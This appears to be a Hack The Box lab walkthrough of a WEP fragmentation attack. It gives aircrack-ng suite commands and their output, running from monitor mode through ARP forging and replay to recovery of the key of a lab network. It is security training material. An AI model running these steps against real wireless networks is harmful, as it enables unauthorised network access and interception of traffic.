#### Enabling Monitor Mode

```sh
3kjS@htb[/htb]$ sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```

After setting the interface into monitor mode, we can verify the change by using the `iwconfig` utility.

```sh
3kjS@htb[/htb]$ iwconfig

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=30 dBm   
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
```
#### Performing the Attack

```sh
3kjS@htb[/htb]$ airodump-ng wlan0mon -c 1 -w WEP
```

Next, we initiate the fragmentation attack with the following command. The `-5` option indicates the fragmentation attack, while `-b` specifies the BSSID of the AP, and `-h` is the MAC address of the connected station (or any source address that can associate with the AP).

```sh
3kjS@htb[/htb]$ aireplay-ng -5 -b A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE wlan0mon
```

A successful fragmentation attack will display an output indicating that the PRGA `xor` file has been saved. Afterward, we need to analyze the capture file to identify the source and destination IP addresses, as well as the MAC addresses. This can be accomplished with `tcpdump`.

```sh
3kjS@htb[/htb]$ tcpdump -s 0 -n -e -r replay_src-0805-191842.cap
```

Once we have the required addresses, we can forge an ARP request using `packetforge-ng`. In this command, we specify the access point's MAC address with `-a`, the station’s MAC address with `-h`, the access point’s IP address with `-k`, the station’s IP address with `-l`, the location and name of our PRGA file with `-y`, and finally the output name for the forged ARP request capture file with `-w`.

```sh
3kjS@htb[/htb]$ packetforge-ng -0 -a A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE -k 192.168.1.1 -l 192.168.1.129 -y fragment-0805-191851.xor -w forgedarp.cap

Wrote packet to: forgedarp.cap 
```

```sh
3kjS@htb[/htb]$ aireplay-ng -2 -r forgedarp.cap -h 42:E9:11:39:88:AE wlan0mon
```

As this process runs, back in the `airodump-ng` output we can notice that the `Frames` count for the connected station increases. This is a positive sign that many IVs are being generated.

```sh
 CH  1 ][ Elapsed: 2 mins ][ 2024-08-05 20:20 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 A2:BD:32:EB:21:15  -47   0     1584    23983  923   1   11   WEP  WEP         HackTheWifi

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 A2:BD:32:EB:21:15  42:E9:11:39:88:AE  -48   11 - 1      0    36015 
```

We do so by specifying the interactive packet replay mode with `-2`, the name and location of our forged packet with `-r`, the source MAC address to inject with `-h` and our interface in monitor mode with `wlan0mon` as shown below.

```sh
3kjS@htb[/htb]$ sudo aireplay-ng -3 -b A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE wlan0mon
```

```sh
3kjS@htb[/htb]$ aircrack-ng -b A2:BD:32:EB:21:15 WEP-01.cap

Got 85311 out of 85000 IVs
Starting PTW attack with 85311 ivs.   
                                              
                     KEY FOUND! [ 33:44:55:22:11 ]    
                     
Reading Decrypted correctly: 100%                                                                                                                        
Opening WEP-01.cap                                                                                                                                       
Read 306522 packets. 
```
